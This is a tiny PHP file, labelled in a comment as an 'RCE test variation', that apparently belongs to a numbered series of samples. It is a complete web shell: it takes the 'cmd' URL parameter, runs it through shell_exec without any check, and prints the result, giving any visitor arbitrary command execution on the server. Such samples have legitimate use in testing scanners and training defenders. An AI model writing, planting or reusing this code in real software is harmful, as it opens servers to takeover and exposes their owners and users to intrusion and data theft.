<?php
// RCE test variation #680
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>